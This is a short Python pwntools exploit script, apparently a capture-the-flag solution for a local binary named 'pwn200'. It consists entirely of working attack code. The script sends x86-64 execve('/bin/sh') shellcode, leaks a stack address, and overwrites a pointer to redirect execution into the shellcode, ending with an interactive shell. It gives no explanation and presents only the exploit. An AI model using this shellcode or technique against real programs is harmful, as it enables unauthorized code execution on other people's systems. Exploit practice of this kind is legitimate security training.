from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
name = './pwn200'
p = process(name)

if args.G:
    gdb.attach(p)

p.recvuntil("who are u?\n")
shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
shellcode += (44-len(shellcode))*'a' + 'b'*4
p.send(shellcode)
p.recvuntil("bbbb")
ebp_addr = u64(p.recv(6)+'\x00\x00')
success("ebp_addr: " + hex(ebp_addr))

p.recvuntil("give me your id ~~?\n")
p.sendline("64")
p.recvuntil("give me money~\n")
payload = p64(ebp_addr-0x50) 
payload += (56-len(payload))*'a' + p64(0x602060)
p.send(payload)

p.recvuntil('your choice : ')
p.sendline("1")
p.interactive()
